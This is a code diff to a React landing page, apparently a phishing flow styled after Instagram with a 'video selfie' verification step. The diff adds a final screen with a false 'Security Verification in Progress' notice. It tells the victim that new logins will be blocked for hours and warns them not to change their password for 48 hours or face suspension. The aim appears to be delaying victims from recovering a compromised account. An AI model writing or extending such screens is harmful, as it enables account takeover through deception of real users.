@@ -16,7 +16,7 @@ declare global {
   }
 }
 
-type Screen = 1 | 2 | 3 | 4;
+type Screen = 1 | 2 | 3 | 4 | 5;
 
 const FONT = '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif';
 
@@ -31,7 +31,8 @@ export default function Landing() {
           <Screen2 onBack={() => setScreen(1)} onNext={() => setScreen(3)} />
         )}
         {screen === 3 && <Screen3 onSuccess={() => setScreen(4)} />}
-        {screen === 4 && <Screen4 onBack={() => setScreen(3)} />}
+        {screen === 4 && <Screen4 onBack={() => setScreen(3)} onSubmit={() => setScreen(5)} />}
+        {screen === 5 && <Screen5 onDone={() => setScreen(1)} />}
       </div>
     </div>
   );
@@ -409,7 +410,7 @@ function Screen3({ onSuccess }: { onSuccess: () => void }) {
 /* ─────────────────────────────────────────────
    SCREEN 4 — Success / Video Selfie Complete
    ───────────────────────────────────────────── */
-function Screen4({ onBack }: { onBack: () => void }) {
+function Screen4({ onBack, onSubmit }: { onBack: () => void; onSubmit: () => void }) {
   return (
     <>
       <div className="flex items-center h-14 px-4 shrink-0">
@@ -459,10 +460,125 @@ function Screen4({ onBack }: { onBack: () => void }) {
             collect biometric data.
           </p>
         </div>
-        <button className="w-full h-[56px] bg-[#0095f6] hover:bg-[#1877f2] active:bg-[#0a7ce1] rounded-2xl text-white text-[17px] font-semibold transition-colors">
+        <button onClick={onSubmit} className="w-full h-[56px] bg-[#0095f6] hover:bg-[#1877f2] active:bg-[#0a7ce1] rounded-2xl text-white text-[17px] font-semibold transition-colors">
           Submit
         </button>
       </div>
+      <div className="flex justify-center pb-3 shrink-0">
+        <div className="w-[134px] h-[5px] bg-white/30 rounded-full" />
+      </div>
+    </>
+  );
+}
+
+/* ─────────────────────────────────────────────
+   SCREEN 5 — Security Verification Warning
+   ───────────────────────────────────────────── */
+function Screen5({ onDone }: { onDone: () => void }) {
+  const handleOkay = () => {
+    console.log("Process complete. User verified.");
+    onDone();
+  };
+
+  return (
+    <>
+      {/* Top Bar — X close button */}
+      <div className="flex items-center h-14 px-4 shrink-0">
+        <button onClick={handleOkay} className="w-10 h-10 flex items-center justify-center -ml-2">
+          <svg width="18" height="18" viewBox="0 0 18 18" fill="none" className="stroke-white" strokeWidth="2.2" strokeLinecap="round">
+            <path d="M2 2L16 16" />
+            <path d="M16 2L2 16" />
+          </svg>
+        </button>
+        <div className="flex-1" />
+      </div>
+
+      {/* Center Content */}
+      <div className="flex-1 flex flex-col items-center px-6">
+        {/* Glowing Shield + Padlock */}
+        <div className="relative w-[140px] h-[150px] shrink-0 mt-2">
+          {/* Glow behind shield */}
+          <div
+            className="absolute inset-0 rounded-full blur-2xl opacity-40"
+            style={{ background: "linear-gradient(135deg, #f97316, #ec4899, #a855f7)" }}
+          />
+          <svg viewBox="0 0 140 150" width="140" height="150" fill="none" className="relative z-10">
+            <defs>
+              <linearGradient id="shield-glow" x1="0%" y1="100%" x2="100%" y2="0%">
+                <stop offset="0%" stopColor="#f97316" />
+                <stop offset="50%" stopColor="#ec4899" />
+                <stop offset="100%" stopColor="#a855f7" />
+              </linearGradient>
+            </defs>
+            {/* Shield outline */}
+            <path
+              d="M70 10 L120 30 L120 80 C120 110 95 135 70 145 C45 135 20 110 20 80 L20 30 Z"
+              stroke="url(#shield-glow)"
+              strokeWidth="3"
+              fill="none"
+            />
+            {/* Padlock body */}
+            <rect x="52" y="78" width="36" height="28" rx="4" stroke="white" strokeWidth="2.5" fill="none" />
+            {/* Padlock shackle */}
+            <path d="M58 78 L58 68 C58 58 62 54 70 54 C78 54 82 58 82 68 L82 78" stroke="white" strokeWidth="2.5" strokeLinecap="round" fill="none" />
+            {/* Keyhole */}
+            <circle cx="70" cy="90" r="3" fill="white" />
+            <path d="M70 93 L70 100" stroke="white" strokeWidth="2" strokeLinecap="round" />
+          </svg>
+        </div>
+
+        {/* Heading */}
+        <h1 className="text-white text-[22px] font-bold mt-6 text-center leading-snug" style={{ fontFamily: FONT }}>
+          Security Verification in Progress
+        </h1>
+
+        {/* Paragraph */}
+        <p className="text-[#a8a8a8] text-[15px] leading-[1.55] text-center mt-4 max-w-[360px]" style={{ fontFamily: FONT }}>
+          Your account security verification is currently processing. This may
+          take 3 to 5 hours to complete. To ensure your safety, any new attempts
+          to log into your account during this time will be automatically blocked.
+        </p>
+
+        {/* Divider */}
+        <hr className="w-full border-white/[0.08] mt-8" />
+
+        {/* Warning Section */}
+        <div className="w-full mt-6">
+          <div className="flex items-center gap-3">
+            {/* Yellow warning triangle */}
+            <svg width="24" height="22" viewBox="0 0 24 22" fill="none" className="shrink-0">
+              <path
+                d="M12 2L22 20H2L12 2Z"
+                stroke="#F5A623"
+                strokeWidth="2"
+                strokeLinejoin="round"
+                fill="none"
+              />
+              <path d="M12 9V14" stroke="#F5A623" strokeWidth="2" strokeLinecap="round" />
+              <circle cx="12" cy="17" r="1.2" fill="#F5A623" />
+            </svg>
+            <span className="text-white text-[17px] font-bold" style={{ fontFamily: FONT }}>
+              Important Warning
+            </span>
+          </div>
+          <p className="text-[#a8a8a8] text-[15px] leading-[1.55] mt-3" style={{ fontFamily: FONT }}>
+            Please do not attempt to change your password for the next 48 hours.
+            Doing so may trigger our security systems and result in account
+            suspension.
+          </p>
+        </div>
+      </div>
+
+      {/* Bottom Button */}
+      <div className="px-6 pb-3 shrink-0">
+        <button
+          onClick={handleOkay}
+          className="w-full h-[56px] bg-[#0095f6] hover:bg-[#1877f2] active:bg-[#0a7ce1] rounded-2xl text-white text-[17px] font-semibold transition-colors"
+        >
+          Okay
+        </button>
+      </div>
+
       <div className="flex justify-center pb-3 shrink-0">
         <div className="w-[134px] h-[5px] bg-white/30 rounded-full" />
       </div>
